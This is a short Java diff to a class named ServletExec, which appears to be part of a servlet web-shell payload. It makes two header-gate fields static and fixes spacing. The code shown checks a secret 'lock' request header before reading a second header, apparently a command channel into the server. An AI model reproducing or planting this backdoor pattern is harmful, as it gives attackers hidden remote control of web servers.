@@ -18,8 +18,8 @@ import java.lang.reflect.Method;
 public class ServletExec implements InvocationHandler {
     private static String HEADER;
     private static String PARAM;
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public ServletExec() {
     }
@@ -35,7 +35,7 @@ public class ServletExec implements InvocationHandler {
     private void run(Object servletRequest, Object servletResponse) {
         try {
             String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
